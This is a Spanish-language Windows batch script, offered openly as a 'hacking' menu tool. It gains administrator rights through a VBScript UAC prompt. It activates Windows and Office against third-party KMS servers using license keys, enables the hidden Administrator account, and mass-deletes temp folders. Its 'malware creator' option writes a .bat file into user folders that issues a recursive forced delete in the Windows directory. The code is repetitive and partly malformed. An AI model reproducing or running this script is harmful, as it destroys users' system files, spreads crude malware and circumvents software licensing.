@echo off


title MY-FILE.bat
ECHO HOLA Y BIENVENIDO %USERNAME%

ping localhost -n 1>nul

REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  


REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  



echo.
echo.
echo SELECCIONE UN COLOR PARA EL PROGRAMA
echo.
ping localhost -n 1>nul
echo.
echo --------------------------------TABLA DE COLORES BY EZE--------------------------------
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo "                    1-COLOR ROJO      " o "     4-COLOR VIOLETA                      "   
ping localhost -n 1>nul              
echo.
ping localhost -n 1>nul
echo "                    2-COLOR AZUL      " o "     5-COLOR AMARILLO                     "
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo "                    3-COLOR VERDE     " o "     6-COLOR PREDETERMINADO               "
ping localhost -n 1>nul
echo.
echo                      7-COLOR CELESTE   " o "     8-COLOR AGUAMARINA
ping localhost -n 1>nul
echo ---------------------------------------------------------------------------------------
echo.
echo.

set/p TABLA DE COLORES BY EZE=Selecciona un color para el programa=

echo.

if "%TABLA DE COLORES BY EZE%"=="1" goto mc1

if "%TABLA DE COLORES BY EZE%"=="2" goto mc2

if "%TABLA DE COLORES BY EZE%"=="3" goto mc3

if "%TABLA DE COLORES BY EZE%"=="4" goto mc4

if "%TABLA DE COLORES BY EZE%"=="5" goto mc5

if "%TABLA DE COLORES BY EZE%"=="6" goto mc6

if "%TABLA DE COLORES BY EZE%"=="7" goto mc7

if "%TABLA DE COLORES BY EZE%"=="8" goto mc8


:mc8
ping localhost -n 1>nul
color 3
ping localhost -n 1>nul
cls 
goto inicio

:mc1

color c

ECHO HAS ELEGIDO EL COLOR ROJO 

ping localhost -n 1>nul

cls

goto inicio

:mc2

color 1

ECHO HAS ELEGIDO EL COLOR AZUL

ping localhost -n 1>nul

cls
goto inicio

:mc7
ping localhost -n 1>nul
color b
cls
ping localhost -n 1>nul
goto inicio

:mc3

color a

ECHO HAS ELEGIDO EL COLOR VERDE


ping localhost -n 1>nul

cls
goto inicio

:mc4


color 5

ECHO HAS ELEGIDO EL COLOR VIOLETA


ping localhost -n 1>nul

cls
goto inicio

:mc5

color 6

ECHO HAS ELEGIDO EL COLOR AMARILLO


ping localhost -n 1>nul

cls

goto inicio

:mc6

color 0f

ECHO HAS ELEGIDO EL COLOR PREDETERMINADO


ping localhost -n 1>nul

cls

goto inicio


:inicio
@echo off
title MY-FILE.bat
cls


REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  


REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  



cls
ping localhost -n 1>nul

echo -------------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo "                                 BATCH SHELL BY EZE                                    "
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo -------------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo. 
ping localhost -n 1>nul
echo "                        1# Activar Windows 10 (metodo hacking)                         "
ping localhost -n 1>nul
echo.
echo "                        2# Desbloquear cuenta de Administrador (metodo hacking)        "
ping localhost -n 1>nul
echo.
echo "                        3# Cambiar o quitar la password (metodo hacking)               "
ping localhost -n 1>nul
echo.
echo "                        4# Apagar la pc                                                "
ping localhost -n 1>nul
echo.
echo "                        5# Utilizar script para liberar memoria en el disco            "
ping localhost -n 1>nul
echo.
echo "                        6# Abrir una powershell                                        "
ping localhost -n 1>nul
echo.
echo "                        7# Crear un Script malicioso                                   "
ping localhost -n 1>nul
echo.
echo "                        8# Activar microsoft office   (solo 2019)                      "
ping localhost -n 1>nul
echo.
echo "                        9# Activar Windows 8 y 8.1                                     "
echo.
ping localhost -n 1>nul
echo "                        10# Salir                                                      "
echo.
ping localhost -n 1>nul
echo -------------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo "                                 BATCH SHELL BY EZE                                    "
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo -------------------------------------------------------------------------------------------

set /p BATCH SHELL BY EZE=Selecciona una opcion = 

if "%BATCH SHELL BY EZE%"=="1" goto o1

if "%BATCH SHELL BY EZE%"=="2" goto o2

if "%BATCH SHELL BY EZE%"=="3" goto o3

if "%BATCH SHELL BY EZE%"=="4" goto o4

if "%BATCH SHELL BY EZE%"=="5" goto o5

if "%BATCH SHELL BY EZE%"=="6" goto o6

if "%BATCH SHELL BY EZE%"=="7" goto o7

if "%BATCH SHELL BY EZE%"=="8" goto o8

if "%BATCH SHELL BY EZE%"=="9" goto o9

if "%BATCH SHELL BY EZE%"=="10" goto o10

:o1
echo.
echo.
echo Activando windows 10 ! ! ! 
ping localhost -n 1>nul
slmgr /ipk 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
slmgr /skms kms.digiboy.ir      o      kms.msguides.com
slmgr /ato
echo.
echo.
ping localhost -n 1>nul
echo Windows ha sido activado ! ! ! gracias a  mi script by eze
echo.
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio


:o3

net user

net user %username% *  

ping localhost -n 1>nul
echo.
echo.
echo Contraseña cambiada con exito
ping localhost -n 1>nul
echo.
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio


:o2
echo.
echo.
echo Activando cuenta de administrador 

ping localhost -n 1>nul
net user administrador /active:yes
echo.
echo.
echo Cuenta de administrador activada con exito!!! gracias a mi script by eze
echo.
echo.
ping localhost -n 1>nul
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio

:o4
echo.
echo.
echo Apagando pc
ping localhost -n 1>nul
shutdown -s -t 20 "TU PC SE APAGARA EN 20 SEGUNDOS POR MI SCRIPT BY EZE"
cls & exit

:o5
echo.
echo.
ping localhost -n 1>nul
echo Eliminando archivos . . .
ping localhost -n 1>nul
echo.
echo.
ping localhost -n 1 >nul
if exist  "C:\$Recycle.Bin" rd  /q /s C:\$Recycle.Bin
if  exist  "C:\Windows\Temp"  rd  /q  /s   C:\Windows\Temp
if  exist  "%temp%\"  rd  /q  /s   %temp%\
echo.
echo.
ping localhost -n 1>nul
echo Archivos eliminados con exito gracias a mi script by eze ! ! !
echo.
echo.
ping localhost -n 1>nul
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio


:o6
echo.
echo.
echo Abriendo powershell . . .
ping localhost -n 1>nul
start powershell.exe
goto inicio


:o7
cls
echo ---------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
ECHO "                                 MALWARE CRETOR BY EZE                             "
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
ECHO ---------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo "                      1-CREAR UN VIRUS EN EL ESCRITORIO                            "
echo.
ping localhost -n 1>nul
echo "                      2-CREAR UN VIRUS EN LA CARPETA DE DESCARGAS                  "
echo.
ping localhost -n 1>nul
echo "                      3-CREAR UN VIRUS EN LA CARPETA DE DOCUMENTOS                 "
ping localhost -n 1>nul
echo.
echo "                      4-CREAR UN VIRUS EN LA CARPETA DE IMAGENES                   "
ECHO.
ping localhost -n 1>nul
echo ---------------------------------------------------------------------------------------
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
ECHO "                                 MALWARE CRETOR BY EZE                             "
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
ECHO ---------------------------------------------------------------------------------------

set/p MALWARE CRETOR BY EZE=Selecciona la ruta de creacion=

if "%MALWARE CRETOR BY EZE%"=="1" goto dump1

if "%MALWARE CRETOR BY EZE%"=="2" goto dump2

if "%MALWARE CRETOR BY EZE%"=="3" goto dump3

if "%MALWARE CRETOR BY EZE%"=="4" goto dump4

:dump1
echo.
echo.
echo Creando directorio y creando el virus
ping localhost -n 1>nul
if not exist "C:\Users\%username%\Desktop\Virus-Creado-By-Eze"  md "C:\Users\%username%\Desktop\Virus-Creado-By-Eze"
ping localhost -n 1>nul
if exist "C:\Users\%username%\Desktop\Virus-Creado-By-Eze"  echo cd %windir% del *.* /q /f /s >>C:\Users\%username%\Desktop\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo.
echo Virus en batch Creado y Guardado en la ruta "C:\Users\%username%\Desktop\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat"
ping localhost -n 1>nul
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio

:dump2
echo.
echo.
echo Creando directorio y creando el virus
ping localhost -n 1>nul
if not exist "C:\Users\%username%\Downloads\Virus-Creado-By-Eze"  md "C:\Users\%username%\Downloads\Virus-Creado-By-Eze"
ping localhost -n 1>nul
if exist "C:\Users\%username%\Downloads\Virus-Creado-By-Eze"  echo cd %windir% del *.* /q /f /s >>C:\Users\%username%\Downloads\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo.
echo Virus en batch Creado y Guardado en la ruta "C:\Users\%username%\Downloads\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat"
ping localhost -n 1>nul
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio

:dump3

echo.
echo.
echo Creando directorio y creando el virus
ping localhost -n 1>nul
if not exist "C:\Users\%username%\Documents\Virus-Creado-By-Eze"  md "C:\Users\%username%\Documents\Virus-Creado-By-Eze"
ping localhost -n 1>nul
if exist "C:\Users\%username%\Documents\Virus-Creado-By-Eze"  echo cd %windir% del *.* /q /f /s >>C:\Users\%username%\Documents\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo.
echo Virus en batch Creado y Guardado en la ruta "C:\Users\%username%\Documents\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat"
ping localhost -n 1>nul
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio

:dump4

echo.
echo.
echo Creando directorio y creando el virus
ping localhost -n 1>nul
if not exist "C:\Users\%username%\Pictures\Virus-Creado-By-Eze"  md "C:\Users\%username%\Pictures\Virus-Creado-By-Eze"
ping localhost -n 1>nul
if exist "C:\Users\%username%\Pictures\Virus-Creado-By-Eze"  echo cd %windir% del *.* /q /f /s >>C:\Users\%username%\Pictures\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat
ping localhost -n 1>nul
echo.
ping localhost -n 1>nul
echo.
echo Virus en batch Creado y Guardado en la ruta "C:\Users\%username%\Pictures\Virus-Creado-By-Eze\Virus-Creado-By-Eze.bat"
ping localhost -n 1>nul
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio


:o8
ping localhost -n 1>nul
echo.
echo - Activando Microsoft Office Standard 2019&echo - Activando Microsoft Office Professional Plus 2019&echo.&echo.&(if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16")&(if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16")&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)&echo.&echo ---------------------------------------------------------------------------------------&echo Activando su ofice personal %username%...&cscript //nologo slmgr.vbs /ckms >nul&cscript //nologo ospp.vbs /setprt:1688 >nul&cscript //nologo ospp.vbs /unpkey:6MWKP >nul&cscript //nologo ospp.vbs /inpkey:NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP >nul&set i=1
:server
if %i%==1 set KMS=kms7.MSGuides.com
if %i%==2 set KMS=kms8.MSGuides.com
if %i%==3 set KMS=kms9.MSGuides.com
if %i%==4 goto notsupported

echo.
echo.
ping localhost -n 1>nul
echo Microsoft ofice ha sido activado con exito ! ! ! gracias a mi script by eze
ping localhost -n 1>nul
echo.
echo.
ping localhost -n 1>nul
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio



goto inicio


:o10

ping localhost -n 1>nul
exit



:o9

echo Activando tu  Windows 8 ...&cscript //nologo slmgr.vbs /ckms >nul&cscript //nologo slmgr.vbs /upk >nul&cscript //nologo slmgr.vbs /cpky >nul&set i=1&wmic os | findstr /I "enterprise" >nul
if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk MHF9N-XY6XB-WVXMC-BTDCT-MKKG7 >nul&cscript //nologo slmgr.vbs /ipk TT4HM-HN7YT-62K67-RGRQJ-JFFXW >nul&cscript //nologo slmgr.vbs /ipk 32JNW-9KQ84-P47T8-D8GGY-CWCK7 >nul&cscript //nologo slmgr.vbs /ipk JMNMF-RHW7P-DMY6X-RF3DR-X2BQT >nul&goto server) else (cscript //nologo slmgr.vbs /ipk GCRJD-8NW9H-F2CDX-CCM8D-9D6T9 >nul&cscript //nologo slmgr.vbs /ipk HMCNV-VVBFX-7HMBH-CTY9B-B4FXY >nul&cscript //nologo slmgr.vbs /ipk NG4HW-VH26C-733KW-K6F98-J8CK4 >nul&cscript //nologo slmgr.vbs /ipk XCVCF-2NXM9-723PB-MHCB7-2RYQQ >nul&cscript //nologo slmgr.vbs /ipk BN3D2-R7TKB-3YPBD-8DRP2-27GG4 >nul&cscript //nologo slmgr.vbs /ipk 2WN2H-YGCQR-KFX6K-CD6TF-84YXQ >nul&cscript //nologo slmgr.vbs /ipk GNBB8-YVD74-QJHX6-27H4K-8QHDG >nul&cscript //nologo slmgr.vbs /ipk M9Q9P-WNJJT-6PXPY-DWX8H-6XWKK >nul&cscript //nologo slmgr.vbs /ipk 7B9N3-D94CG-YTVHR-QBPX3-RJP64 >nul&cscript //nologo slmgr.vbs /ipk BB6NG-PQ82V-VRDPW-8XVD2-V8P66 >nul&cscript //nologo slmgr.vbs /ipk 789NJ-TQK6T-6XTH8-J39CJ-J8D3P >nul)
:server
if %i%==1 set KMS=kms7.MSGuides.com
if %i%==2 set KMS=kms8.MSGuides.com
if %i%==3 set KMS=kms9.MSGuides.com
if %i%==4 goto notsupported
cscript //nologo slmgr.vbs /skms %KMS%:1688 >nul

echo.
echo.
echo Tu windos ya esta activado ! ! !  gracias a mi script by eze
ping localhost -n 1>nul
echo.
echo.
echo Presione una tecla para continuar . . .
pause>nul
ping localhost -n 1>nul
goto inicio

